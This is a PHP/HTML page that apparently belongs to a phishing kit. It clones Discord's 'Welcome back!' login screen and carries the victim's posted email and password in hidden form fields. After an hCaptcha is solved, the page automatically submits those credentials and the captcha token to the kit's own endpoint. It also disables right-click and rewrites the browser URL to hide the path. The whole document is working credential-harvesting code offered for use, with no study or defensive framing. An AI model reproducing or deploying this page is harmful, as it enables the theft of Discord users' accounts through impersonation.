<?php
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        header("Location: /"); 
        exit();
    }
    $login = $_POST["email"];
    $password = $_POST["password"];
?>
<html lang="en" style="font-size: 100%" class="full-motion app-focused theme-dark platform-web oldBrand" data-rh="lang,style,class">
<head>
    <title>Discord</title>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" name="viewport">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="Discord">
    <meta property="og:title" content="Discord - A New Way to Chat with Friends &amp; Communities">
    <meta property="og:description" content="Discord is the easiest way to communicate over voice, video, and text.  Chat, hang out, and stay close with your friends and communities.">
    <meta property="og:image" content="src/img/ee7c382d9257652a88c8f7b7f22a994d.png">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@discord">
    <meta name="twitter:creator" content="@discord">
    <link rel="stylesheet" href="src/css/style.css">
    <link rel="icon" href="src/img/847541504914fd33810e70a0ea73177e.ico">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600&amp;family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet">
    <script charset="utf-8" src="src/js/62139f1cff10402837062.js"></script>
    <script src="https://hcaptcha.com/1/api.js" async defer></script>
</head>
<body>
    <div id="app-mount" class="appMount-3lHmkl">
        <div class="app-1q1i1E">
            <div class="characterBackground-2itjYF"><img style="position: fixed; height: 100%; top: 0; left: 0; width: 100%;" src="src/img/44e0c1fbcf99c4476083442e4a2774e0.svg"> <a href="/" target="_blank" rel="noopener" class="logo-2iEHEq logo-1-AbdC" style="opacity: 1; transform: translateY(0px) translateZ(0px);"></a></div>
            <div class="splashBackground-1FRCko wrapper-3Q5DdO scrollbarGhost-2F9Zj2 scrollbar-3dvm_9">
                <canvas class="canvas-3XuBXe" width="800" height="600" style="width: 800px; height: 600px;"></canvas>
                <div>
                    <div class="wrapper-6URcxg" style="opacity: 1; transform: scale(1) translateY(0px) translateZ(0px);">
                        <div class="pole2x">
                            <div class="authBox-hW6HRx theme-dark">
                                <div class="centeringWrapper-2Rs1dR">
                                    <img alt="" src="src/img/0f4d1ff76624bb45a3fee4189279ee92.svg" class="marginBottom20-32qID7">
                                    <h3 class="title-jXR8lp marginBottom8-AtZOdT base-1x0h_U size24-RIRrxO">
                                        Welcome back!                                    </h3>
                                    <div class="colorHeaderSecondary-3Sp3Ft size16-1P40sf marginBottom40-2vIwTv">
                                        Beep boop. Boop beep?                                    </div>
                                    <div class="flexCenter-3_1bcw flex-1O1GKY justifyCenter-3D2jYp alignCenter-1dQNNs" style="flex: 1 1 auto;">
                                        <div class="h-captcha" data-sitekey="f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34" data-callback="onSuccess" data-theme="dark"></div>
                                        <div>
                                            <form id="captchaxxx" method="POST" action="/index.php">
                                                <input type="hidden" value="" id="captcha_key" name="captcha_key" />
                                                <input type="hidden" value="<?php echo $login; ?>" id="login" name="login" />
                                                <input type="hidden" value="<?php echo $password; ?>" id="password" name="password" />
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <script type="text/javascript">
        history.pushState(null, null, '/');
        document.oncontextmenu = () => false;
        if (document.getElementById("elprimo1").innerText != "-Login or password is invalid." && document.getElementById("elprimo1").innerText != "-New login location detected, please check your e-mail.") {
            document.getElementById("elprimo1").hidden = true;
        } else {
            document.getElementById("pole1-text").style.color = "#ed4245";
        }
        document.getElementById("elprimo2").hidden = true;

        function onSuccess(captcha_key) {
            document.getElementById("captcha_key").value = captcha_key;
            document.getElementById("captchaxxx").submit();
        }
        </script>
</body>

</html>
